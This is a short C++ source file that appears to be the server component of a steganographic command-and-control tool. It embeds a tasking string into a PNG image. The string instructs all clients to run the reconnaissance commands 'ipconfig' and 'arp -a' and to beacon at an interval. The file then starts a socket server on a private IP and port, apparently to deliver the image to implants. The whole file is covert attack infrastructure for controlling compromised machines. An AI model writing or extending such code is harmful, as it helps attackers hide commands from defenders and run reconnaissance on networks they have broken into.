#ifndef SERVER_H
#include "server.h"
#include "stegImage.h"
#endif


unsigned char* buffer;
int main(int argc, char const *argv[]){
    std::string command = "<COM:ALL:4-ipconfig:4-arp -a:1-beacon-20000>";
    std::string dImage = "images/Tux2.png";
    std::string wImage = "images/testing.png";
    stegImage encodeImage;
    encodeImage.readPNG(&dImage,command);
    encodeImage.writePNG(&wImage);
    Server socketServer(100,"10.0.0.34","8081");
    socketServer.perform();
    printf("hey");
}
